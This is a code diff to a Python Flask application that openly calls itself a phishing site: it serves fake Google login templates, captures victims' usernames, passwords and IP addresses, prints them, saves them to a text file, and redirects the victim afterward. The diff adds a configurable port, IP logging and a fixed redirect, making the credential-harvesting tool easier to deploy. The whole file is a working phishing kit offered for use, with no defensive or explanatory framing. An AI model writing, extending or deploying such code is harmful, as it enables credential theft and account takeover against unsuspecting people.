@@ -2,14 +2,22 @@ from flask import Flask, render_template, request, redirect, url_for
 from threading import Thread
 import os
 import time
-from multiprocessing import Process
-#from Phishing.camera import start_camera_window
 
 app = Flask(__name__, template_folder='Phishing/templates/Google')
 
 print('Let\'s set up your phishing site')
 action_url = input('Paste the link here that will redirect the user after phishing (leave blank if you do not need a redirect): ')
-#connect_to_camera = input("Do you want to connect camera? (The user will be prompted to connect to the camera!): ")
+port = input("Enter the port of your site (Default: 8080): ")
+
+# Set default port if not provided
+if not port:
+    port = 8080
+else:
+    try:
+        port = int(port)
+    except ValueError:
+        print("Invalid port number. Using default port 8080.")
+        port = 8080
 
 username = None
 
@@ -26,15 +34,15 @@ def login():
     password = request.form['password']
     user_ip = request.remote_addr
     camera_permission = request.form.get('camera_permission', False)
+    
     print('User: ', username)
     print('Password: ', password)
-
-    #print('Camera permission granted:', camera_permission)
+    print(f"User IP address: {user_ip}")
+    print('Camera permission granted:', camera_permission)
     
-    # Start a new thread to handle Tkinter window
-    #if camera_permission:
-    #    Thread(target=start_camera_window).start()
-
+    # Start a new thread to handle Tkinter window if needed
+    # if camera_permission:
+    #     Thread(target=start_camera_window).start()
 
     current_path = os.path.abspath(os.path.dirname(__file__))
     file_path = os.path.join(current_path, 'google_user_data.txt')
@@ -45,21 +53,19 @@ def login():
         print("Data written to file successfully.")
     except Exception as e:
         print(f"Error writing to file: {e}")
-    else:
-        print('User did not grant camera permission.')
-
+    
     # Redirect conditionally based on action_url
     if action_url:
         return redirect(action_url)
     else:
-        return redirect(url_for('information'))  # Redirect to the home endpoint
+        return redirect(url_for('infa'))
 
 @app.route("/information")
 def infa():
     return render_template('Blok.html')
 
 def run_flask():
-    app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)
+    app.run(host='0.0.0.0', port=port, debug=True, use_reloader=False)
 
 if __name__ == '__main__':
     print("Starting the server...")
@@ -71,3 +77,4 @@ if __name__ == '__main__':
             time.sleep(1)
     except KeyboardInterrupt:
         print("Stopping server...")
+        # Flask will automatically stop when the main thread is interrupted.
